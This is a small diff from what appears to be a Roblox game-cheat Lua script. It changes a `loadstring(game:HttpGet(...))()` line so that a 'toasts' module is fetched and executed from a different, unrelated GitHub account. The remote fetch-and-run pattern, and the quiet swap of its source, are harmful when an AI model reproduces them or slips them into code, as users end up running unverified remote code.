@@ -27,7 +27,7 @@ local Success, Error = pcall(function()
 	-- 												  it's scuffed but works on literally any exec
 
 	local Toasts = loadstring(
-		game:HttpGet("https://raw.githubusercontent.com/centerepic/sasware-fisch/refs/heads/main/toasts.lua")
+		game:HttpGet("https://raw.githubusercontent.com/pre1tyboy/xxviqqtt/refs/heads/main/toasts.lua")
 	)()
 
 	do
